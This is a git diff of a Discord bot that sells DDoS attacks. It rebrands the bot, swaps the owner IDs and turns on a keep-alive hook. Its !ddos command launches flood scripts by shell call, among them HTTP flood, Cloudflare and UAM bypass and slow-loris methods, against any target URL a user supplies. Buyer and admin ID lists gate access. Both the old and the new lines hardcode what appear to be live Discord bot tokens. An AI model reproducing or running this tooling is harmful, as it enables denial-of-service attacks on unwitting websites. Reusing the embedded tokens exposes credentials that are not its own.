@@ -13,15 +13,20 @@ from discord.ext.commands import Bot
 from os import system        
 from os import name                  
 from colorama import *                                                
-import random, datetime, discord                        
+import random, datetime, discord  
+
+from keep_alive import keep_alive
+
+keep_alive()
+
 #=====User && Methods Setting=====#
-buyers  = [1009349664631435294]  #          
-admins  = [1009349664631435294]  #   ID users            
-owners  = [1009349664631435294]  #          
+buyers  = [998164623704461402]  #          
+admins  = [998164623704461402]  #   ID users            
+owners  = [998164623704461402]  #          
 methods = ['HTTP-FLOOD', 'HTTP-RAW', 'HTTP-RAND', 'HTTP-SOCKET','CLOUDFLARE','UAM-BYPASS','SLOW'] # Methods
 year_now= datetime.datetime.now().strftime("%Y")     
-token   = 'MTA2MjcyOTQyMjg0NDczMTUwMg.Gj54hz.Im27o_M4nanWHJCynFvKh758SyEuSAA7H51cik' # paste your token here
-intents = discord.Intents.default()
+token   = 'MTA1NzE4NTk1OTE4OTQxODA0Ng.GRV22a.QwJ-mezBnno1jTUgVt6T8jfY_a1igxLJbvHGis' # paste your token here
+intents = discord.Intents.all()
 intents.members = True 
 intents.message_content = True
 intents.messages = True
@@ -37,11 +42,11 @@ async def random_color():
 #=====Bot Command=====#
 @bot.command()
 async def help(ctx):
-        embed = discord.Embed(title="HANAKI-DDOS | DDoS Methods", description=f"DDoS Methods | {ctx.author.mention}", color=await random_color())
+        embed = discord.Embed(title="Hoan's DDoS | DDoS Methods", description=f"DDoS Methods | {ctx.author.mention}", color=await random_color())
         embed.add_field(name = "**All Methods**", value = f"```yaml\nHTTP-FLOOD\nHTTP-RAW\nHTTP-RAND\nHTTP-SOCKET\nCLOUDFLARE\nUAM-BYPASS\nSLOW```")
         embed.add_field(name = "**Syntax**", value = "```md\n!ddos <method> <url> <thread> <time>```")
-        embed.add_field(name = "**NOTE**", value = "> __**Không Spam!**__ Các Cuộc Tấn Công Hoặc Kế Hoạch Của Bạn\n > __Sẽ Bị  **Loại Bỏ**__.\n\n> Trân Trọng, \n> HANAKI-DDOS.")
-        embed.set_footer(text = f"©{year_now} Copyright Nguyễn Trí Lộc.")
+        embed.add_field(name = "**NOTE**", value = "> __**Không Spam!**__ Các Cuộc Tấn Công Hoặc Kế Hoạch Của Bạn\n > __Sẽ Bị  **Loại Bỏ**__.\n\n> Trân Trọng, \n> Hoan's DDOS.")
+        embed.set_footer(text = f"©{year_now} Copyright Ngc.")
         await ctx.send(embed=embed)
 @bot.command()
 async def add_buyer(ctx, buyer : int = None):
@@ -136,73 +141,73 @@ async def ddos(ctx, method : str = None, victim : str = None, thread : str = Non
                 else:
                     thread2 = int(thread)
                 if method == 'HTTP-FLOOD':
-                    embed = discord.Embed(title=f"HANAKI | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
+                    embed = discord.Embed(title=f"Hoan's DDoS | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
                     embed.set_thumbnail(url="https://raw.githubusercontent.com/kyletran191/host/main/img.gif")
                     embed.add_field(name = "**Method**", value = f"```yaml\n{method}```")
                     embed.add_field(name = "**Thread**", value = f"```yaml\n{thread2}```")
                     embed.add_field(name = "**Time**", value = f"```yaml\n{time2}```")
                     embed.add_field(name = "**Target**", value = f"```yaml\n{victim}```")
-                    embed.set_footer(text = f"©{year_now} Copyright Nguyễn Trí Lộc.")
+                    embed.set_footer(text = f"©{year_now} Copyright Khải Hoàn.")
                     await ctx.send(embed=embed)
                     system(f'go run httpflood.go {victim} {thread2} get {time2} nil')
                 elif method == 'HTTP-RAW':
-                    embed = discord.Embed(title=f"HANAKI | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
+                    embed = discord.Embed(title=f"Hoan's DDoS | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
                     embed.set_thumbnail(url="https://raw.githubusercontent.com/kyletran191/host/main/img.gif")
                     embed.add_field(name = "**Method**", value = f"```yaml\n{method}```")
                     embed.add_field(name = "**Thread**", value = f"```yaml\n{thread2}```")
                     embed.add_field(name = "**Time**", value = f"```yaml\n{time2}```")
                     embed.add_field(name = "**Target**", value = f"```yaml\n{victim}```")
-                    embed.set_footer(text = f"©{year_now} Copyright Nguyễn Trí Lộc.")
+                    embed.set_footer(text = f"©{year_now} Copyright Khải Hoàn.")
                     await ctx.send(embed=embed)
                     system(f'node HTTP-RAW.js {victim} {time2}')
                 elif method == 'HTTP-RAND':
-                    embed = discord.Embed(title=f"HANAKI | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
+                    embed = discord.Embed(title=f"Hoan's DDoS | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
                     embed.set_thumbnail(url="https://raw.githubusercontent.com/kyletran191/host/main/img.gif")
                     embed.add_field(name = "**Method**", value = f"```yaml\n{method}```")
                     embed.add_field(name = "**Thread**", value = f"```yaml\n{thread2}```")
                     embed.add_field(name = "**Time**", value = f"```yaml\n{time2}```")
                     embed.add_field(name = "**Target**", value = f"```yaml\n{victim}```")
-                    embed.set_footer(text = f"©{year_now} Copyright Nguyễn Trí Lộc.")
+                    embed.set_footer(text = f"©{year_now} Copyright Khải Hoàn.")
                     await ctx.send(embed=embed)
                     system(f'node HTTP-RAND.js {victim} {time2}')
                 elif method == 'HTTP-SOCKET':
-                    embed = discord.Embed(title=f"HANAKI | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
+                    embed = discord.Embed(title=f"Hoan's DDoS | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
                     embed.set_thumbnail(url="https://raw.githubusercontent.com/kyletran191/host/main/img.gif")
                     embed.add_field(name = "**Method**", value = f"```yaml\n{method}```")
                     embed.add_field(name = "**Thread**", value = f"```yaml\n{thread2}```")
                     embed.add_field(name = "**Time**", value = f"```yaml\n{time2}```")
                     embed.add_field(name = "**Target**", value = f"```yaml\n{victim}```")
-                    embed.set_footer(text = f"©{year_now} Copyright Nguyễn Trí Lộc.")
+                    embed.set_footer(text = f"©{year_now} Copyright Khải Hoàn.")
                     await ctx.send(embed=embed)
                     system(f'node HTTP-SOCKET.js {victim} 7000 {time2}')
                 elif method == 'CLOUDFLARE':
-                    embed = discord.Embed(title=f"HANAKI | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
+                    embed = discord.Embed(title=f"Hoan's DDoS | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
                     embed.set_thumbnail(url="https://raw.githubusercontent.com/kyletran191/host/main/img.gif")
                     embed.add_field(name = "**Method**", value = f"```yaml\n{method}```")
                     embed.add_field(name = "**Thread**", value = f"```yaml\n{thread2}```")
                     embed.add_field(name = "**Time**", value = f"```yaml\n{time2}```")
                     embed.add_field(name = "**Target**", value = f"```yaml\n{victim}```")
-                    embed.set_footer(text = f"©{year_now} Copyright Nguyễn Trí Lộc.")
+                    embed.set_footer(text = f"©{year_now} Copyright Khải Hoàn.")
                     await ctx.send(embed=embed)
                     system(f'node cf.js {victim} {time2} {thread2}')
                 elif method == 'UAM-BYPASS':
-                    embed = discord.Embed(title=f"HANAKI | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
+                    embed = discord.Embed(title=f"Hoan's DDoS | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
                     embed.set_thumbnail(url="https://raw.githubusercontent.com/kyletran191/host/main/img.gif")
                     embed.add_field(name = "**Method**", value = f"```yaml\n{method}```")
                     embed.add_field(name = "**Thread**", value = f"```yaml\n{thread2}```")
                     embed.add_field(name = "**Time**", value = f"```yaml\n{time2}```")
                     embed.add_field(name = "**Target**", value = f"```yaml\n{victim}```")
-                    embed.set_footer(text = f"©{year_now} Copyright Nguyễn Trí Lộc.")
+                    embed.set_footer(text = f"©{year_now} Copyright Khải Hoàn.")
                     await ctx.send(embed=embed)
                     system(f'node uambypass.js {victim} {time2} 2000 http.txt')
                 elif method == 'SLOW':
-                    embed = discord.Embed(title=f"HANAKI | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
+                    embed = discord.Embed(title=f"Hoan's DDoS | DDoS Attack Sent", description=f"Attack Sent! {ctx.author.mention}", color=await random_color())
                     embed.set_thumbnail(url="https://raw.githubusercontent.com/kyletran191/host/main/img.gif")
                     embed.add_field(name = "**Method**", value = f"```yaml\n{method}```")
                     embed.add_field(name = "**Thread**", value = f"```yaml\n{thread2}```")
                     embed.add_field(name = "**Time**", value = f"```yaml\n{time2}```")
                     embed.add_field(name = "**Target**", value = f"```yaml\n{victim}```")
-                    embed.set_footer(text = f"©{year_now} Copyright Nguyễn Trí Lộc.")
+                    embed.set_footer(text = f"©{year_now} Copyright Khải Hoàn.")
                     await ctx.send(embed=embed)
                     system(f'node slow.js {victim} {time2}')
 
@@ -217,7 +222,7 @@ async def on_ready():
 \033[1;93m88`8b      88    88      88~~~~~   88~~~b. 88    88    88    
 \033[1;96m88 `88.    88    88booo. 88.       88   8D `8b  d8'    88    
 \033[1;97mYP   YD    YP    Y88888P Y88888P   Y8888P'  `Y88P'     YP 
-\033[1;92m                                      @NguyenTriLoc(HANAKI)
+\033[1;92m                                      @HoanDepTraiKhoaiTo.(HANAKI)
 \033[1;97m=============================================================
     """
     if name == 'nt':
